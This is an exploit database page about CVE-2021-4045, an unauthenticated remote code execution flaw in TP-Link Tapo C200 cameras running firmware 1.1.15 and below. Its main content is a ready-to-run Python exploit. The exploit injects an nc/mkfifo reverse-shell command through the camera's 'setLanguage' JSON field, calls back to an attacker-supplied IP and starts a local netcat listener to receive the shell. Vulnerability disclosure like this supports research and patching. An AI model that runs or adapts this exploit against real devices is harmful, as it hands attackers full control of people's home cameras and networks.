---
title: TP-Link Tapo c200 1.1.15 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2023020037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-23
fetch_date: 2025-10-04T07:49:49.366346
---

# TP-Link Tapo c200 1.1.15 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **TP-Link Tapo c200 1.1.15 Remote Code Execution (RCE)** **2023.02.22**  Credit:  **[hacefresko](https://cxsecurity.com/author/hacefresko/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-4045](https://cxsecurity.com/cveshow/CVE-2021-4045/ "Click to see CVE-2021-4045")**  CWE: **[CWE-77](https://cxsecurity.com/cwe/CWE-77 "CWE-77")**  CVSS Base Score: **10/10**  Impact Subscore: **10/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

# Exploit Title: TP-Link Tapo c200 1.1.15 - Remote Code Execution (RCE)
# Date: 02/11/2022
# Exploit Author: hacefresko
# Vendor Homepage: https://www.tp-link.com/en/home-networking/cloud-camera/tapo-c200/
# Version: 1.1.15 and below
# Tested on: 1.1.11, 1.1.14 and 1.1.15
# CVE : CVE-2021-4045
# Write up of the vulnerability: https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce
import requests, urllib3, sys, threading, os
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
PORT = 1337
REVERSE\_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
NC\_COMMAND = 'nc -lv %d' % PORT # nc command to receive reverse shell (change it depending on your nc version)
if len(sys.argv) < 3:
print("Usage: python3 pwnTapo.py <victim\_ip> <attacker\_ip>")
exit()
victim = sys.argv[1]
attacker = sys.argv[2]
print("[+] Listening on %d" % PORT)
t = threading.Thread(target=os.system, args=(NC\_COMMAND,))
t.start()
print("[+] Serving payload to %s\n" % victim)
url = "https://" + victim + ":443/"
json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE\_SHELL % (attacker, PORT) + ";'"}}
requests.post(url, json=json, verify=False)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020037)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top